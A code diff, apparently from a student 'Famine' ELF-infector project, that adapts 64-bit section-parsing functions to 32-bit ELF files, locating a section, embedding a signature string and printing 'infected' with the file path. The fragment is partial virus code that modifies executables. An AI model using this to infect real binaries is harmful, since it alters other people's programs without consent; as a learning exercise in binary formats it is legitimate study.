@@ -1,12 +1,12 @@
 #include "famine.h"
 
-u_int64_t	section_getter(char *ptr, size_t size, int fd)
+u_int32_t	section_getter32(char *ptr, size_t size, int fd)
 {
-	Elf64_Ehdr *ehdr = (Elf64_Ehdr*) ptr;
+	Elf32_Ehdr *ehdr = (Elf32_Ehdr*) ptr;
 
 	u_int16_t	shnum			= ehdr->e_shnum;
-	Elf64_Off	sht_offset		= ehdr->e_shoff;
-	Elf64_Shdr	*shdr = (Elf64_Shdr *) (ptr + sht_offset);
+	Elf32_Off	sht_offset		= ehdr->e_shoff;
+	Elf32_Shdr	*shdr = (Elf32_Shdr *) (ptr + sht_offset);
 	char 		*ajustor = ptr + (shdr + ehdr->e_shstrndx)->sh_offset;
 
 	char		*message = "face a la patate, tout est possible #Famine (jucapik)";
@@ -25,10 +25,10 @@ u_int64_t	section_getter(char *ptr, size_t size, int fd)
 	return (0);
 }
 
-int		write_string(char *ptr, size_t size, char *path, int fd)
+int		write_string32(char *ptr, size_t size, char *path, int fd)
 {
-	u_int64_t	sectionoff;
-	sectionoff = section_getter(ptr, size, fd);
+	u_int32_t	sectionoff;
+	sectionoff = section_getter32(ptr, size, fd);
 
 	printf(GREEN"infected %s\n"RESET, path);
 
